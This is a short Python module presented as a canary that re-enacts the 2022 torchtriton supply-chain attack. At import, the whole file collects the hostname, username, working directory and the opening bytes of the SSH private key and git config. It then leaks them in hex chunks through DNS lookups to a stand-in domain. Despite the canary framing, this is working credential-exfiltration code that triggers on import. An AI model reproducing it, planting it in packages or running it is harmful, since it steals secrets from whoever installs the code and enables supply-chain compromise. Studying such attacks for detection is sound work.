"""Canary modelled on torchtriton 3.0.0 (2022): host data exfiltrated over DNS at import."""
import getpass
import os
import socket

_uid = "c4n4ry"
_data = (socket.gethostname() + "|" + getpass.getuser() + "|" + os.getcwd()).encode()
for _p in ("~/.ssh/id_rsa", "~/.gitconfig"):
    try:
        _data += open(os.path.expanduser(_p), "rb").read()[:64]
    except OSError:
        pass
for _i in range(0, len(_data), 30):
    socket.gethostbyname(_data[_i:_i + 30].hex() + "." + _uid + ".h4ck.invalid")
